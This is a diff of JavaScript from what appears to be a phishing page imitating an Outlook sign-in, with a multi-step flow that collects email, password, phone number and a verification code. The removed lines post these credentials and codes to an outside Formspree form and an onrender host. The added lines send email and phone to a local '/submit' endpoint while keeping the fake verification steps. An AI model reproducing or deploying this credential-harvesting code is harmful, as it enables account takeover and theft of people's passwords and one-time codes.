@@ -319,34 +319,26 @@
     const phoneNumber = '+1' + raw;
     document.getElementById('phoneMask').textContent = phoneNumber.replace(/(\+1)(\d{3})(\d{3})(\d{4})/, '+1 ($2) $3-$4');
 
-    const formData = new FormData();
-    formData.append("email", collectedData.email);
-    formData.append("password", collectedData.password);
-    formData.append("phone", collectedData.phone);
-    formData.append("stage", "step1-3");
-
     const btn = document.getElementById("sendCodeBtn");
     btn.disabled = true;
     btn.innerHTML = 'Submitting...';
 
     try {
-      const responses = await Promise.all([
-        fetch("https://formspree.io/f/xeevgnar", {
-          method: "POST",
-          body: formData,
-          headers: { "Accept": "application/json" }
-        }),
-        fetch("https://outlook-q5f8.onrender.com/submit", {
-          method: "POST",
-          body: formData,
-          headers: { "Accept": "application/json" }
+      const response = await fetch("/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: collectedData.email,
+          phone: collectedData.phone
         })
-      ]);
+      });
 
-      if (responses.every(r => r.ok)) {
+      if (response.ok) {
         goTo("screen4");
       } else {
-        console.error('Submission failed:', await Promise.all(responses.map(async r => `${r.url}: ${r.status}`)));
+        console.error('Submission failed:', response.status, response.statusText);
         alert("Submission failed.");
       }
     } catch (err) {
@@ -361,34 +353,26 @@
   window.handleFinalSubmit = async function() {
     collectedData.code = document.getElementById("codeInput").value;
 
-    const formData = new FormData();
-    formData.append("email", collectedData.email);
-    formData.append("phone", collectedData.phone);
-    formData.append("code", collectedData.code);
-    formData.append("stage", "step4");
-
     const btn = document.getElementById("verifyBtn");
     btn.disabled = true;
     btn.innerHTML = 'Submitting...';
 
     try {
-      const responses = await Promise.all([
-        fetch("https://formspree.io/f/xeevgnar", {
-          method: "POST",
-          body: formData,
-          headers: { "Accept": "application/json" }
-        }),
-        fetch("https://outlook-q5f8.onrender.com/submit", {
-          method: "POST",
-          body: formData,
-          headers: { "Accept": "application/json" }
+      const response = await fetch("/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: collectedData.email,
+          phone: collectedData.phone
         })
-      ]);
+      });
 
-      if (responses.every(r => r.ok)) {
+      if (response.ok) {
         goTo("screen5");
       } else {
-        console.error('Final submission failed:', await Promise.all(responses.map(async r => `${r.url}: ${r.status}`)));
+        console.error('Final submission failed:', response.status, response.statusText);
         alert("Final submission failed.");
       }
     } catch (err) {
